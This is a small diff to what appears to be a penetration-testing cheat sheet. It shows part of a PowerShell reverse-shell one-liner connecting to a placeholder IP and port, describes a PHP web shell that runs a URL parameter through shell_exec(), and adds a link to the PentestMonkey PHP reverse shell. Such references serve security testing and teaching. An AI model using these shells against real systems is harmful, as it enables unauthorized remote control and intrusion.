@@ -106,6 +106,8 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 This will take a GET parameter in the URL and execute it on the system with shell_exec().  
 <img src="https://user-images.githubusercontent.com/73976100/222945750-dac50e93-affe-4e85-96b6-c223ae5689d4.png" width="600">  
 
+[PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  
+
 
 
 
